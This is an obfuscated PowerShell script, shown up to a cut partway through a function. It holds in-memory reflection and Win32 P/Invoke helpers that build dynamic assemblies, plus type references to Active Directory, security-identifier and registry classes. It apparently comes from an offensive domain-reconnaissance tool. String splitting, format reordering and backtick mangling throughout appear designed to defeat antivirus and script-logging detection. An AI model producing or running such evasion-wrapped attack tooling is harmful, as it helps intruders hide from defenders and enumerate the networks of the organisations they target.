 set-itEM ("VArI"+"ABlE:C"+"I"+"42K5")  ([TyPE]("{1}{0}"-F 'UiD','g')) ;${IC`Zd}  =[typE]("{3}{8}{5}{6}{4}{2}{7}{9}{1}{0}" -F'N','iNgcOnvenTIo','ROpSerVicE','r','E','me','.Int','S','uNti','.cAll');    sEt ("94"+"HDG") ( [tyPE]("{1}{8}{3}{9}{7}{2}{0}{6}{5}{4}"-F 'IceS.c','R','pserV','NtimE','t','SE','har','nterO','u','.I')  ) ;    seT-ITeM  ('V'+'ariAbL'+'E:1'+'oepl'+'9')  ([TyPe]("{8}{2}{4}{5}{7}{6}{10}{9}{3}{0}{1}" -F'l','IMPORTATTRIbuTe','ME','S.DL','.in','TE','v','ROPseR','runti','Ce','I') ) ; ${u`z04}= [tYPe]("{1}{2}{3}{0}"-f'UTE','fLA','GSa','tTRIB')  ;   SEt-ItEM  ('VaRia'+'BL'+'e'+':ET'+'1O3')  (  [type]("{3}{5}{6}{7}{4}{0}{2}{1}"-f'GS','E','Iz','reF','t.paCkIN','l','eC','TiOn.EmI')  ) ; ${N`zK}=[type]("{0}{3}{2}{1}{5}{4}"-F'ReFLEctiON.TyPE','r','T','at','UTes','IB') ;  Set-vARIAble  ('ct'+'7')  ([TyPE]("{5}{2}{4}{0}{1}{3}{8}{6}{7}" -F 'op','s','E.I','erVIceS.M','nTer','RunTim','AttrI','bute','aRShalaS') ); SV  ("{0}{1}"-f 'c','uY')  ([Type]("{0}{1}" -f 'tYp','E')  ) ;  ${G`E5S}  = [tYpE]("{2}{0}{4}{3}{1}"-F'mIt','ES','ReflEcTIon.e','oD','.oPC') ;  Set-item  ("{4}{0}{3}{2}{1}"-f 'ia','X0o',':Sj3','blE','VaR')  ( [typE]("{2}{0}{1}" -F '.pAT','H','IO'));  seT-ItEm ("{0}{2}{1}" -f 'VaRiaBlE','9e',':H') ([TYPE]("{0}{2}{1}" -F 'sY','EM.io.fiLE','St'))  ;  ${tPM`OR}  =[TyPE]("{1}{2}{5}{0}{4}{3}"-F'M','sYS','tEm.','DE','O','Io.filE') ;    sEt-VaRiABLE ('mV'+'6') ([tYPe]("{0}{2}{3}{1}" -F'Sy','s','stEm.Io.FI','LeACCeS') )  ;  sEt-ItEm  ("{1}{3}{0}{2}" -f 'D51w','VARIA','oI','BlE:') ( [type]("{1}{2}{0}"-f 'hARe','IO.','FILes'))  ; Set-iTeM ('vArIAB'+'LE:kF'+'aD'+'9') ( [TYPe]("{1}{0}{2}"-F'n','nET.D','S') );  SV ("{0}{1}{2}"-f'Bn','OX','5t') ([tYPE]("{0}{1}{2}"-f'ActI','vaT','oR')  ); set-ITeM  ("vaRia"+"b"+"lE:R5"+"iP") ([type]("{0}{3}{2}{1}{4}"-f'syST','I','AD','Em.tHRe','nG.ThrEaD'))  ;  Set-IteM  ("{2}{0}{1}" -f'4XE','B','vaRIaBle:') (  [TypE]("{5}{3}{2}{4}{0}{1}" -f 'BL','Y','ioN.AsSe','EFLECT','M','r') ) ;${E`2`AbvZ}  =  [TYPE]("{2}{1}{0}{3}{4}"-f 'b','tem.','SyS','I','tCoNvErTER') ;  Set-vAriAble  ("{0}{1}" -f 'L','8i6') ([TyPe]("{4}{3}{0}{1}{5}{2}{6}"-f 'tIOn.bin','d','GFLA','lEC','SyStem.rEF','in','gs') ) ; sEt  ("{1}{0}" -f '9','l7')  ( [type]("{1}{3}{6}{7}{2}{8}{4}{5}{0}"-F'y','SYS','Ti','tem.REF','.assem','bL','L','EC','ON') ); Set-iTem ('vAriaBLE:'+'4'+'rQW') (  [tyPE]("{4}{2}{9}{8}{10}{6}{5}{3}{7}{0}{11}{1}" -f'a','e','ysTEm.DIreCTorYSERv','OC','s','oT','pr','OlS.','s','ICe','.','Uthtyp'))  ;  seT-vaRiABLe  ("{2}{1}{0}"-f'71Z','k','Nv')  ([type]("{10}{7}{8}{0}{9}{3}{11}{1}{4}{6}{5}{2}" -f'R','sER','InGoptiON','t','vIceS.RE','As','FerRAlcH','YSTEM.D','i','ec','s','oRY') ) ;   ${t`XG8V} =  [TYpE]("{4}{5}{6}{0}{2}{1}{3}"-f 'ReCtorY','S.seCuRity','serviCE','MASkS','s','ysTeM','.Di') ; ${h`Zo} = [Type]("{1}{3}{5}{6}{4}{0}{8}{7}{2}"-F 'T','Sys','orY.DOmain','T','SeRvICes.AC','em.diR','eCToRy','Ct','ivEdIrE');   sET-Item  ("VaRIABL"+"E:"+"5y"+"XV6C")  ( [TYPe]("{1}{0}" -f'T','ConVER')  )  ;  seT-item  ("{2}{0}{1}" -f'ar','iaBlE:G604','V') ( [TypE]("{1}{0}" -f'um','En') )  ; ${D`9X8}  =[tYPe]("{1}{2}{0}"-F'er','bITconV','Ert') ; seT-iTEM  ('V'+'Ar'+'IAbLE:pcD') (  [type]("{3}{5}{0}{2}{6}{1}{4}"-F'm.S','TOpt','t','SYsT','IoNs','e','RiNGsPLI')  );  sV ("{1}{0}" -f'5E','u')  (  [tYPE]("{0}{1}" -f'REGE','x')); set-ITem ("{0}{1}{2}" -f 'vAr','IaB','le:j76') ( [TyPe]("{3}{5}{7}{8}{4}{6}{2}{0}{1}" -F'ceS.','MaRsHAL','I','S','.iNTeRopsER','YSTEM.','v','r','UntimE')); sEt  ('N'+'OT0')  ([tYPe]("{0}{1}"-f 'iO.f','iLE')  )  ;   ${46`1`BPd} =  [TyPe]("{5}{1}{2}{0}{6}{9}{4}{3}{7}{8}"-f 'aGEmENt.AUToMa','Tem.M','AN','s.iNitIaLsES','e','sYS','TION.R','siONS','tatE','UNspac');  sET  ("{1}{0}"-f'R','Il1b') (  [typE]("{4}{6}{3}{0}{1}{2}{5}" -F 'A','PARTMenT','S','.THreadinG.','sys','TaTE','TEm'))  ;  SeT  ("{0}{1}"-f'nuQ','B') (  [TYPE]("{4}{3}{2}{1}{0}" -F'oRY','AcT','Ef','NspAC','ru')  ); ${RD`N`F1G}  =[TyPE]("{0}{1}{2}"-f 'PoW','eRsHeL','l');  seT-vArIABlE  ("r"+"QF06")  ([tYPE]("{2}{0}{1}" -F'vI','ronMeNt','en')  ) ;    SEt-varIaBLE ("{0}{1}" -f '6Lu5g','4') ( [TypE]("{4}{1}{0}{3}{2}"-F 'STE','Y','NEt.Dns','M.','S'))  ; sEt-iTEM  ("{3}{1}{2}{0}"-f'e:F9T47y','ARi','abl','V')  (  [tyPe]("{0}{2}{1}"-F 'datET','e','Im'));${R`eIq}  = [TyPE]("{1}{2}{3}{0}"-f 'oRY','i','o.d','IrECT'); SV  43s ( [typE]("{9}{0}{4}{5}{3}{6}{8}{1}{7}{2}"-f 'C','lKnOW','iDtYpE','i','URIty','.pR','nCIPal.w','nS','el','SYsTEm.sE'));  ${vp`zS}=  [Type]("{7}{5}{8}{0}{2}{4}{1}{6}{3}"-f '.inTe','S.M','RoPseR','RshAL','ViCE','u','a','r','NTIMe') ;   Set-ITeM  ("{0}{1}{2}" -f'vARI','A','Ble:fbG')  ([tYpe]("{4}{0}{2}{9}{3}{10}{5}{7}{6}{1}{8}"-f'eM.','r','d','RYserViCe','SYSt','ctIVediREc','O','toRY.f','est','IRectO','s.A') ) ;  ${vH`As} =  [TYpE]("{0}{1}"-F 'arra','Y')  ;    set-IteM  ("V"+"arI"+"ABlE"+":DH3TrM")  ([type]("{4}{0}{2}{3}{1}" -F'YsTEM','nVErT','.c','O','s'))  ;   set-ItEM ("{0}{4}{1}{2}{3}" -f 'VAriA','le:','7Tq','02','b') ([TYPe]("{6}{2}{4}{7}{8}{1}{0}{3}{5}"-f'd','e','nAgEm','ENT','e','iAl','Ma','nt.aut','oMATION.pscR')) ;SEt-vaRiaBle  ("{1}{0}"-f'LC','M1') ( [tYpe]("{5}{2}{1}{0}{4}{3}"-F'XT.','e','em.t','NG','encODI','sYSt') )  ;    sEt-vARIABle ("{1}{0}"-f 'n0f','e') ([typE]("{6}{5}{0}{4}{7}{3}{1}{2}"-F'oFT.','E','y','Yk','win32.RE','s','miCro','giSTR')) ; seT-VaRIABle  ('Kd'+'lp') ([type]("{2}{1}{0}" -F 'NG','Tri','S')) ;  SET-ItEm ("V"+"aRIAb"+"le"+":ZfVW1")  ([TYpe]("{0}{1}{2}"-f'iN','t','pTr')) ;  sV ("y7"+"DxW")  ( [TyPE]("{0}{1}" -F 'INT3','2')  ); 












function new`-INMEM`O`R`YM`OdUle {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{6}{5}{7}{3}{2}{4}" -f'PSUse','Shou','Functio','g','ns','i','ldProcessForStateChang','n'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOsitiON = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${M`OD`ULenAMe} =  ${C`i42K5}::("{1}{2}{0}"-f 'uid','Ne','wG').Invoke().("{0}{1}"-f 'To','String').Invoke()
    )

    ${a`pPd`O`maIN} =   ( Ls  ("{1}{3}{4}{0}{2}" -f'Le:4Xe','vArI','B','a','B')  )."VA`Lue"."ASs`E`mBlY".("{0}{1}"-f 'Ge','tType').Invoke(("{3}{4}{1}{2}{0}"-f 'n','A','ppDomai','Sys','tem.')).("{2}{0}{1}" -f 'o','perty','GetPr').Invoke(("{2}{0}{1}" -f 'urr','entDomain','C')).("{1}{0}{2}"-f 'l','GetVa','ue').Invoke(${N`Ull}, @())
    ${loaDe`dA`sS`eMbli`ES} = ${APp`DOMa`in}.("{2}{4}{0}{1}{3}"-f 'em','bl','Get','ies','Ass').Invoke()

    foreach (${AssEm`B`Ly} in ${LoAD`EDasSE`M`Bl`ies}) {
        if (${AS`Se`mbLy}."fu`lLN`AmE" -and (${A`s`SeMBlY}."FuLL`NA`mE".("{1}{0}" -f 'lit','Sp').Invoke(',')[0] -eq ${MOdU`len`A`ME})) {
            return ${Asse`MB`ly}
        }
    }

    ${d`ynAsSem`B`ly} = &("{1}{3}{0}{2}"-f'Obje','Ne','ct','w-') ("{2}{3}{1}{0}" -f'lyName','Assemb','Reflectio','n.')(${mOd`UL`eNAme})
    ${DO`mAIn} = ${A`pPD`omaiN}
    ${ASSEmBly`Bu`iL`d`ER} = ${d`OMAIn}.("{1}{0}{3}{2}" -f 'efineDy','D','ssembly','namicA').Invoke(${DY`NaS`SeMB`lY}, 'Run')
    ${m`o`DUlEbuil`deR} = ${A`sSeMBLY`BuI`l`dER}.("{1}{3}{2}{0}{4}{5}" -f'o','De','M','fineDynamic','d','ule').Invoke(${M`oD`Ul`eNaME}, ${Fal`se})

    return ${m`oDuL`e`BuIlD`eR}
}




function Fu`Nc {
    Param (
        [Parameter(PoSItioN = 0, mAndAtoRY = ${T`RUE})]
        [String]
        ${dLlN`A`mE},

        [Parameter(PoSiTiOn = 1, MANDaTORy = ${T`Rue})]
        [string]
        ${FuncTiO`N`NAme},

        [Parameter(POsITION = 2, mANdAtorY = ${T`RUe})]
        [Type]
        ${r`e`TURNTYPE},

        [Parameter(POSItioN = 3)]
        [Type[]]
        ${PAraMEt`erTYp`Es},

        [Parameter(pOSitION = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${NAti`VecAlLI`NG`cONV`e`NtiON},

        [Parameter(poSitIoN = 5)]
        [Runtime.InteropServices.CharSet]
        ${CH`AR`SeT},

        [String]
        ${eNtrYp`o`INT},

        [Switch]
        ${SEt`L`A`STerrOr}
    )

    ${P`R`O`peRtieS} = @{
        ("{1}{0}{2}" -f'll','D','Name') = ${dL`l`NaME}
        ("{0}{1}{2}{3}"-f 'Funct','ionN','am','e') = ${Fun`Ct`i`OnNAme}
        ("{2}{0}{1}" -f'rn','Type','Retu') = ${RetUr`N`Type}
    }

    if (${PaRaMet`e`RtYP`eS}) { ${p`Ro`pEr`TIes}[("{1}{0}{3}{2}" -f 'ram','Pa','es','eterTyp')] = ${pa`R`A`mEterTy`peS} }
    if (${nA`T`ivECaLlin`gcO`NvEntiON}) { ${PRoPe`Rt`iEs}[("{6}{5}{0}{1}{2}{3}{4}"-f'ingCo','n','ve','ntio','n','all','NativeC')] = ${NATi`VECAlLiN`gc`on`VEnTioN} }
    if (${c`HArseT}) { ${pr`operTI`Es}[("{1}{0}{2}"-f 'harse','C','t')] = ${cHA`Rs`et} }
    if (${s`etlA`STE`Rr`oR}) { ${PRop`e`RTi`es}[("{0}{1}{2}"-f 'S','etLast','Error')] = ${Setlas`T`e`RRoR} }
    if (${en`TR`YpO`Int}) { ${p`ROp`er`Ties}[("{0}{2}{1}"-f'E','Point','ntry')] = ${Entr`Ypo`iNt} }

    &("{2}{0}{1}" -f 'ew-Ob','ject','N') ("{2}{0}{1}" -f 'jec','t','PSOb') -Property ${pro`pERti`Es}
}


function Add-wiN3`2T`YPE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(mAnDATORY=${TR`Ue}, vaLUefROmPiPeliNEByProPERtyNaMe=${t`RUe})]
        [String]
        ${D`Llna`me},

        [Parameter(MaNdATorY=${TR`UE}, vaLuEfRomPIpEliNEbyproPErTYNAMe=${tr`UE})]
        [String]
        ${fu`NCTiOn`NaMe},

        [Parameter(VALUEFrompIPeLiNEBYpRoPeRTynAme=${Tr`Ue})]
        [String]
        ${en`TRyP`OI`NT},

        [Parameter(mandAtoRy=${T`RUe}, ValUefrOmpIpELinebyPROpERtynAme=${Tr`Ue})]
        [Type]
        ${Ret`Urn`TypE},

        [Parameter(VaLuEfROMPipEliNebyPropERTYnAMe=${tr`UE})]
        [Type[]]
        ${pA`RAm`ete`R`TYPes},

        [Parameter(VAluEfROmPiPeLinEbyProPERtYnAmE=${Tr`Ue})]
        [Runtime.InteropServices.CallingConvention]
        ${nA`Ti`VecaLLInG`cO`Nven`TION} =   (Get-VaRiaBlE ("{0}{1}"-f'IcZ','D') )."V`ALue"::"S`TdC`ALl",

        [Parameter(valueFrOMPIPelInEbypROpERtYNAmE=${t`Rue})]
        [Runtime.InteropServices.CharSet]
        ${CH`ARS`ET} =   ${94h`dg}::"A`Uto",

        [Parameter(ValueFRoMpIPELiNeBYpROpeRtyNaME=${T`RUe})]
        [Switch]
        ${seTL`AstEr`RoR},

        [Parameter(MAnDaTORy=${tr`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`DuLE},

        [ValidateNotNull()]
        [String]
        ${nA`m`ESPAce} = ''
    )

    BEGIN
    {
        ${t`Y`pEhAsh} = @{}
    }

    PROCESS
    {
        if (${mO`D`ULe} -is [Reflection.Assembly])
        {
            if (${n`AmE`Space})
            {
                ${Typ`eha`SH}[${D`LlnaMe}] = ${M`ODUle}.("{0}{1}{2}" -f'Ge','tTy','pe').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${TY`pe`HaSh}[${dLL`N`AME}] = ${m`o`DuLe}.("{1}{2}{0}"-f'pe','G','etTy').Invoke(${dL`l`NaME})
            }
        }
        else
        {
            
            if (!${Ty`P`Ehash}.("{0}{1}{2}{3}"-f 'Contains','K','e','y').Invoke(${dlL`NA`me}))
            {
                if (${Na`meSP`Ace})
                {
                    ${TYPEH`A`sH}[${D`L`LNAME}] = ${M`odu`Le}.("{0}{1}{2}" -f'De','fine','Type').Invoke("$Namespace.$DllName", ("{5}{2}{6}{0}{1}{3}{4}" -f'c',',B','bl','efor','eFieldInit','Pu','i'))
                }
                else
                {
                    ${ty`P`EhAsH}[${d`lLNamE}] = ${mOd`ULe}.("{0}{1}{2}"-f'D','efineTyp','e').Invoke(${dllNA`mE}, ("{2}{0}{1}{3}{4}" -f 'lic,','Befo','Pub','reField','Init'))
                }
            }

            ${mE`THod} = ${t`ypeH`AsH}[${DL`L`Name}].("{1}{2}{0}"-f 'thod','D','efineMe').Invoke(
                ${F`UNc`Tio`NnAme},
                ("{0}{1}{3}{6}{2}{5}{4}"-f'Pub','lic,Sta','e','ti','l','Imp','c,Pinvok'),
                ${r`Et`UR`NtYpE},
                ${PAra`Me`Te`RT`YpeS})

            
            ${i} = 1
            foreach(${p`ARaM`e`TeR} in ${p`Ar`A`MEtErtypEs})
            {
                if (${pA`RameT`ER}."I`sByREf")
                {
                    [void] ${M`E`ThOd}.("{3}{1}{2}{4}{0}" -f 'er','e','fine','D','Paramet').Invoke(${I}, 'Out', ${N`Ull})
                }

                ${I}++
            }

            ${d`LLIm`PoRt} = [Runtime.InteropServices.DllImportAttribute]
            ${se`TLAstERrOrF`I`Eld} = ${DL`LiMPO`RT}.("{1}{0}{2}"-f't','Ge','Field').Invoke(("{1}{2}{0}{3}"-f'o','S','etLastErr','r'))
            ${CalLIngcO`NVENTi`o`Nf`I`Eld} = ${DLL`I`mpO`Rt}.("{1}{0}{2}" -f'etFiel','G','d').Invoke(("{0}{4}{1}{2}{3}"-f'Ca','ven','t','ion','llingCon'))
            ${ChaRSetFI`E`LD} = ${dll`iMp`oRt}.("{1}{0}" -f'tField','Ge').Invoke(("{2}{1}{0}" -f'et','rS','Cha'))
            ${ENTryPo`iN`T`FI`ELd} = ${dl`LIm`Port}.("{2}{1}{0}" -f'eld','etFi','G').Invoke(("{2}{1}{0}" -f 'Point','ntry','E'))
            if (${Setl`As`TErrOr}) { ${SlevAl`UE} = ${tr`UE} } else { ${SLe`VAl`UE} = ${fal`Se} }

            if (${P`S`B`OU`NdparaMET`erS}[("{1}{2}{0}"-f 'oint','En','tryP')]) { ${e`xPO`RTedFUNC`NAMe} = ${eNT`Ry`poINt} } else { ${E`xPoRteDf`UnC`NAME} = ${F`UnCt`IonnaMe} }

            
            ${COnsTr`U`CtOr} =   (ChildITEM ('v'+'arIAbl'+'E:1'+'OEPl'+'9'))."v`AlUE"."GEt`c`ON`StR`UcTor"([String])
            ${DLLIM`po`RtA`T`TrIbUTE} = &("{0}{2}{1}"-f 'New-','ect','Obj') ("{1}{4}{7}{2}{8}{3}{5}{6}{0}"-f 'r','Ref','.E','t.Custom','lectio','Attribut','eBuilde','n','mi')(${coN`s`TRUCTOR},
                ${d`lL`NAmE}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${se`T`La`StE`RRoRfield},
                                           ${c`AL`liNGcO`NVENt`i`onfIe`ld},
                                           ${cH`A`RsEtFIELD},
                                           ${ent`RyPO`IntFI`e`Ld}),
                [Object[]] @(${slEvA`lue},
                             ([Runtime.InteropServices.CallingConvention] ${N`ATi`VECaLlInG`conVEnT`I`on}),
                             ([Runtime.InteropServices.CharSet] ${c`hA`RSet}),
                             ${EXPo`RTEd`FUnc`NAME}))

            ${MET`h`OD}.("{2}{1}{3}{0}{4}" -f's','C','Set','u','tomAttribute').Invoke(${Dl`L`IMPo`Rta`TtrIBU`TE})
        }
    }

    END
    {
        if (${M`oDU`lE} -is [Reflection.Assembly])
        {
            return ${t`yP`EH`ASH}
        }

        ${re`Tu`RNTYp`eS} = @{}

        foreach (${K`EY} in ${tYp`ehAsH}."k`Eys")
        {
            ${T`ype} = ${Ty`Pe`hash}[${k`eY}].("{1}{0}{2}{3}"-f 'at','Cre','eT','ype').Invoke()

            ${Re`T`URn`TYPEs}[${K`Ey}] = ${tY`PE}
        }

        return ${RE`TUr`NTy`pes}
    }
}


function ps`EN`Um {


    [OutputType([Type])]
    Param (
        [Parameter(POSItIoN = 0, mANdAtoRY=${t`RuE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`Od`ULe},

        [Parameter(PoSiTioN = 1, manDaToRy=${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FuLlN`A`mE},

        [Parameter(posItIon = 2, manDAtory=${TR`UE})]
        [Type]
        ${tY`pe},

        [Parameter(PosITioN = 3, mAndATORY=${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${En`UMEl`e`m`eNtS},

        [Switch]
        ${b`ITFie`ld}
    )

    if (${m`od`ULE} -is [Reflection.Assembly])
    {
        return (${Mod`UlE}.("{0}{1}{2}"-f 'GetTy','p','e').Invoke(${fu`Ll`NaMe}))
    }

    ${e`N`UmtYPE} = ${TY`Pe} -as [Type]

    ${e`NUm`BuildER} = ${m`OdU`Le}.("{1}{0}{2}"-f 'eEn','Defin','um').Invoke(${fULl`N`Ame}, ("{1}{0}" -f'lic','Pub'), ${en`UM`TYPE})

    if (${bITf`i`elD})
    {
        ${flaG`scoN`STr`UCt`Or} =  (Get-VArIABlE ("{1}{0}" -f '4','uZ0') -VA)."g`E`TcOnS`TrUctOR"(@())
        ${fLagScU`StoMattr`i`Bute} = &("{0}{1}{2}"-f'New-','Obj','ect') ("{2}{8}{0}{1}{3}{6}{4}{7}{5}" -f 'ction.','Emit.C','Ref','u','t','uteBuilder','s','omAttrib','le')(${F`laGsConSt`RuC`T`Or}, @())
        ${enuMbUIl`D`eR}.("{0}{1}{2}{3}" -f'SetCus','tomAt','tri','bute').Invoke(${FlA`g`SCu`S`ToMATtRiBUTE})
    }

    foreach (${K`ey} in ${En`UMELemE`NTS}."ke`ys")
    {
        
        ${NU`Ll} = ${E`NUm`BuI`LDer}."DE`FI`NEliTe`R`AL"(${K`ey}, ${E`Numel`E`Me`NTs}[${k`Ey}] -as ${enU`m`TY`pe})
    }

    ${ENUmB`U`ilDER}.("{3}{1}{0}{2}" -f'Ty','reate','pe','C').Invoke()
}




function fi`ELd {
    Param (
        [Parameter(POsITion = 0, MaNdATory=${tr`Ue})]
        [UInt16]
        ${po`SiT`iOn},

        [Parameter(POSiTIoN = 1, MaNdatORy=${t`RuE})]
        [Type]
        ${t`YpE},

        [Parameter(POSitION = 2)]
        [UInt16]
        ${Of`FSET},

        [Object[]]
        ${M`A`RshaLas}
    )

    @{
        poSition = ${P`OsI`TIoN}
        ("{0}{1}" -f 'Ty','pe') = ${TY`Pe} -as [Type]
        ("{1}{2}{0}" -f't','Offs','e') = ${ofF`SET}
        ("{0}{2}{1}" -f 'Mars','alAs','h') = ${MaR`S`haLaS}
    }
}


function S`TruCT
{


    [OutputType([Type])]
    Param (
        [Parameter(PoSiTioN = 1, MaNDaTory=${Tr`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mOdu`lE},

        [Parameter(PosItion = 2, MAndaTory=${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`Ul`LnAME},

        [Parameter(pOsItiON = 3, MAnDaToRY=${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${sT`Ru`CTfiEl`dS},

        [Reflection.Emit.PackingSize]
        ${pA`CkI`NgSizE} =   ${eT`1O3}::"unspeCI`F`ied",

        [Switch]
        ${EX`p`Li`ciTLAy`OUt}
    )

    if (${mod`ULe} -is [Reflection.Assembly])
    {
        return (${M`odu`lE}.("{1}{0}"-f 'tType','Ge').Invoke(${FU`Lln`AMe}))
    }

    [Reflection.TypeAttributes] ${st`RUC`T`ATtriBUTES} = ("{5}{16}{12}{14}{18}{4}{11}{19}{0}{6}{2}{8}{13}{24}{23}{7}{10}{22}{15}{21}{20}{17}{3}{1}{9}"-f ' ','dI',' ','l','  ','Ansi',' ','
  ',' ','nit','      S','Class','
','  Pu','    ',',','Class,','eFie','  ',',
  ','       Befor','
 ','ealed','lic,','b')

    if (${e`XPLiC`I`TlaYOUt})
    {
        ${s`TR`Ucta`Tt`RiButes} = ${S`TruC`T`ATt`RIBuTes} -bor   (dir  ("{0}{1}{3}{2}"-f'VaRiABle',':n','k','Z'))."V`AluE"::"e`XP`LIciTlayouT"
    }
    else
    {
        ${s`TrUc`TaTTRiB`UteS} = ${St`Ru`CT`A`T`TRiBUTEs} -bor  (  variAblE  ("{0}{1}"-f 'N','ZK') )."vAl`Ue"::"seQU`en`TiA`LL`AYOUt"
    }

    ${sT`R`UcT`BUILDEr} = ${modu`Le}."de`FIN`etypE"(${F`Ulln`Ame}, ${STRucTAtTrI`B`U`TEs}, [ValueType], ${PA`Ck`INgsI`zE})
    ${c`OnsTRuc`TO`RInfo} =   ( DIr  ("v"+"ARIabLE:"+"CT7") )."vAl`Ue".("{1}{2}{0}{3}"-f 'str','GetC','on','uctors').Invoke()[0]
    ${s`iZec`ONSt} = @( ( gi  ("v"+"ARiABL"+"e:cT"+"7") )."vaL`Ue".("{2}{0}{1}" -f'F','ield','Get').Invoke(("{2}{1}{0}"-f'Const','ize','S')))

    ${FiE`l`dS} = &("{2}{0}{1}" -f'w-Obje','ct','Ne') ("{1}{2}{0}"-f'le[]','Has','htab')(${S`TR`Uc`Tfie`ldS}."Cou`Nt")

    
    
    
    foreach (${Fie`LD} in ${st`RU`cTFi`eL`ds}."k`eYS")
    {
        ${in`d`EX} = ${sTr`U`Ct`FIel`DS}[${FI`E`Ld}][("{1}{0}" -f 'sition','Po')]
        ${F`IEl`ds}[${iN`dEx}] = @{("{2}{1}{0}" -f'e','Nam','Field') = ${fie`ld}; ("{1}{0}{2}" -f 'ert','Prop','ies') = ${s`TrUctF`i`EL`ds}[${Fie`lD}]}
    }

    foreach (${fi`elD} in ${f`IE`LdS})
    {
        ${f`Ie`ldN`AMe} = ${F`i`Eld}[("{2}{0}{1}"-f 'am','e','FieldN')]
        ${fi`ElD`PRoP} = ${FIe`LD}[("{0}{1}{2}"-f 'Pro','p','erties')]

        ${Of`FSEt} = ${Fie`L`DpROp}[("{1}{0}"-f'set','Off')]
        ${t`yPE} = ${fIe`l`dproP}[("{0}{1}"-f'T','ype')]
        ${M`A`RSHalas} = ${F`iE`lDprOp}[("{0}{1}{2}" -f'M','arshalA','s')]

        ${nEw`F`iELD} = ${st`RuCTb`UIlDeR}.("{0}{1}{2}{3}"-f 'D','efineFie','l','d').Invoke(${FiE`Ldn`AMe}, ${tY`pE}, ("{0}{1}"-f'Pu','blic'))

        if (${marS`h`ALaS})
        {
            ${uNM`A`NAGedt`yPE} = ${Mars`ha`lAS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${m`ArS`HaLaS}[1])
            {
                ${S`izE} = ${mA`RsHAL`AS}[1]
                ${Attr`Ib`BuIlDeR} = &("{2}{0}{1}"-f 'je','ct','New-Ob') ("{7}{1}{6}{5}{10}{4}{2}{9}{8}{3}{11}{0}"-f 'uilder','e','s','ribut','t.Cu','.E','ction','Refl','tt','tomA','mi','eB')(${c`OnstRuCTori`N`FO},
                    ${UnMAN`AGeD`TyPe}, ${S`iZ`EconSt}, @(${Si`Ze}))
            }
            else
            {
                ${A`TTrI`BbuIl`dEr} = &("{0}{1}{2}"-f 'N','ew','-Object') ("{0}{7}{8}{1}{5}{4}{6}{3}{2}" -f 'R','ion.Emit','er','uteBuild','Cu','.','stomAttrib','eflec','t')(${constRUCt`o`Ri`NFo}, [Object[]] @(${UN`ma`NAg`EDT`ype}))
            }

            ${new`Fi`ElD}.("{2}{0}{4}{1}{3}"-f 'usto','but','SetC','e','mAttri').Invoke(${atTri`Bb`U`iLDer})
        }

        if (${E`XPlic`iTLayo`UT}) { ${neW`FieLd}.("{1}{0}{2}" -f 'fs','SetOf','et').Invoke(${of`F`SeT}) }
    }

    
    
    ${sIz`E`meTH`od} = ${S`T`RuCtB`UiLDER}.("{1}{0}{2}{3}" -f'f','De','ineMetho','d').Invoke(("{1}{0}"-f'ize','GetS'),
        ("{1}{0}{2}{3}" -f 'ubl','P','ic, ','Static'),
        [Int],
        [Type[]] @())
    ${IL`g`EnEra`TOR} = ${SIz`eMEth`od}.("{3}{0}{1}{2}{4}"-f 'ILGe','nerat','o','Get','r').Invoke()
    
    ${ilG`en`eR`AtOr}.("{1}{0}"-f'mit','E').Invoke( (  LS ('vA'+'RIable:G'+'E5S'))."vAl`Ue"::"l`DTOKen", ${sT`RUct`BUi`lDer})
    ${ILg`En`eRA`ToR}.("{1}{0}"-f'mit','E').Invoke( ${g`e5s}::"CA`LL",
         ( lS  ("{2}{0}{3}{1}" -f'aBLe','y','vArI',':cU') )."vA`lUe".("{2}{0}{1}"-f'etMet','hod','G').Invoke(("{0}{1}{3}{2}" -f 'Get','Typ','le','eFromHand')))
    ${iLG`EnE`Rat`OR}.("{1}{0}" -f't','Emi').Invoke( (  gCi  ('VArIA'+'BlE:'+'g'+'e5s'))."V`AlUE"::"C`ALL",
          ( vARIAblE  ("{1}{0}"-f 'zS','VP'))."VAl`Ue".("{0}{1}{2}"-f 'G','etMeth','od').Invoke(("{2}{0}{1}"-f 'zeO','f','Si'), [Type[]] @([Type])))
    ${Il`GE`N`eRaTOr}.("{1}{0}" -f't','Emi').Invoke( (Get-VArIABLe ("{0}{1}"-f 'g','e5S') )."VA`lue"::"R`eT")

    
    
    ${IMP`li`CiTCo`NvERteR} = ${s`TRuC`TbUil`dER}.("{0}{2}{1}{3}"-f'Defi','th','neMe','od').Invoke(("{2}{0}{1}" -f '_Impl','icit','op'),
        ("{3}{5}{7}{2}{6}{11}{14}{0}{10}{13}{4}{9}{1}{8}{12}" -f 'c, Sta','lNa','ope, ','Priva','g, Spec','te','P','Sc','m','ia','tic, Hid','ubl','e','eBySi','i'),
        ${stR`UC`Tbui`LdEr},
        [Type[]] @([IntPtr]))
    ${ilg`eNERa`T`O`R2} = ${iMPlIcItc`onVeR`T`Er}.("{0}{3}{2}{1}" -f 'G','enerator','LG','etI').Invoke()
    ${ILgenErA`To`R2}.("{1}{0}"-f't','Emi').Invoke(  ${G`E5S}::"N`oP")
    ${IL`g`eNeRato`R2}.("{1}{0}" -f'it','Em').Invoke(  ( varIaBlE  ("{0}{1}" -f'G','E5s') -VALUEo )::"Ld`AR`G_0")
    ${ilGEne`R`ATOr2}.("{1}{0}"-f'it','Em').Invoke(  (gCI  ("{0}{2}{1}"-f 'VaRIaBLE','E5s',':G') )."v`Alue"::"L`dtoken", ${stR`UctB`UI`ld`eR})
